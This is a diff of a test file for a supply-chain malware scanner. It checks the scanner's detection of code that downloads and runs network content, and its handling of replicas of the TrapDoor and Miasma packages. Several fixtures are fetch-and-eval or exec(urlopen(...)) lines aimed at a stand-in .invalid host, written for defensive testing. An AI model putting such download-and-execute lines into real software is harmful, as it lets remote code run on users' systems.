@@ -1,13 +1,13 @@
-// Code that runs what it receives over the network (lib/received.js, twin of
-// core.runs_received_code), a download substituted into a command line
-// (lib/shellpipe.js), and binding.gyp command expansions that run a file of
-// the package (lib/supplychain.js scanGyp, src/deps.js). The replica tests
+// Code that runs what it receives over the network (the native engine's
+// runs_received_code, lib/native.js), a download substituted into a command
+// line, and binding.gyp command expansions that run a file of the package
+// (lib/supplychain.js scanGyp, src/deps.js). The replica tests
 // of TrapDoor (import-time code downloading code into `node -e`) and Miasma
 // v2 (a binding.gyp expansion running the payload, no install script) were
 // no finding and a MAJOR; python/tests/scanner/test_review_received_code.py
 // and test_review_gyp_expansions.py have the full cases, and
-// tests/architecture/test_js_parity_hooks.py / test_js_parity_gyp.py compare
-// the engines. Everything is inert text: hosts are .invalid.
+// tests/architecture/test_snapshot_signs.py / test_js_parity_gyp.py hold
+// the engine and the packages. Everything is inert text: hosts are .invalid.
 
 import { test } from "node:test";
 import assert from "node:assert/strict";
@@ -72,6 +72,28 @@ test("received code is found on its line, in both tests", () => {
     assert.equal(runsReceivedCode(text), null, text.slice(0, 80));
     assert.ok(!importTimeRisk(text)[0].includes(REASON));
   }
+});
+
+test("a program written in a string is text; one that runs what it fetches is read as code", () => {
+  // (0.1.8) the network call a string literal's text names is the literal's own code: xmlhttprequest's
+  // program for `node -e` was "runs code it receives over the network" (core._dl_in_code)
+  const text = [
+    "var execString = \"var http = require('http'), https = require('https'), fs = require('fs');\"\n  + \"var req = doRequest(options, function(response) {\"\n  + \"response.on('data', function(chunk) { responseText += chunk; });\"\n  + \"response.on('end', function() { fs.writeFileSync('\" + contentFile + \"', responseText); });\"\n  + \"});\";\nvar syncProc = spawn(process.argv[0], [\"-e\", execString]);\n",   // xmlhttprequest's program for node -e
+    "import subprocess, sys\ncode = \"import urllib.request as u; print(u.urlopen('https://files.invalid/p').read())\"\nsubprocess.run([sys.executable, '-c', code])\n",   // printed, in Python
+    "execSync(\"node -e \\\"require('https').get('https://files.invalid/p', r => r.pipe(process.stdout))\\\"\");\n",   // in a command line's text
+    "import os\ncmd = f\"python -c \\\"import urllib.request as u; print(u.urlopen('{url}').read())\\\"\"\nos.system(cmd)\n",   // in an f-string's text
+  ];
+  for (const t of text) {
+    assert.equal(runsReceivedCode(t), null, t.slice(0, 60));
+    assert.deepEqual(importTimeRisk(t), [[], null]);
+  }
+  const code = [
+    ["const s = \"require('https').get('https://files.invalid/p', r => { let d = ''; r.on('data', c => d += c); r.on('end', () => eval(d)); })\";\nspawn(process.execPath, ['-e', s], { detached: true });\n", 1],   // the program runs what it fetches
+    ["import subprocess, sys\ncode = \"import urllib.request as u; exec(u.urlopen('https://files.invalid/p').read())\"\nsubprocess.run([sys.executable, '-c', code])\n", 2],   // in Python
+    ["const code = `${await (await fetch(u)).text()}`;\neval(code);\n", 2],   // a template literal's interpolation
+    ["import os, requests\nos.system(f\"python -c \\\"{requests.get(u).text}\\\"\")\n", 2],   // an f-string's interpolation
+  ];
+  for (const [t, line] of code) assert.equal(runsReceivedCode(t), line, t.slice(0, 60));
 });
 
 const DESERIAL_REASON = "deserializes data it receives over the network";
@@ -216,7 +238,7 @@ test("--deps: the Miasma and TrapDoor replicas", () => {
     run(["check", root, "--deps", "--out-dir", out, "--no-html", "--quiet"], { out: () => {}, err: () => {}, env: {} });
     const rep = JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
     const got = rep.issues.filter((i) => i.rule.startsWith("SC-")).map((i) => [i.rule, i.file.replaceAll("\\", "/"), i.sev, i.msg]);
-    const env = "reads environment variables or credential files and sends data over the network";
+    const env = "sends environment variables over the network (the whole environment)";
     assert.deepEqual(got.sort(), [
       ["SC-IMPORT-RISK", "venv/lib/python3.12/site-packages/trapdoor_py/__init__.py", "CRITICAL", `Dependency code ${REASON}.`],
       ["SC-INSTALL-HOOK", "node_modules/miasma/binding.gyp", "CRITICAL", `Install hook runs index.js, which ${env}.`],
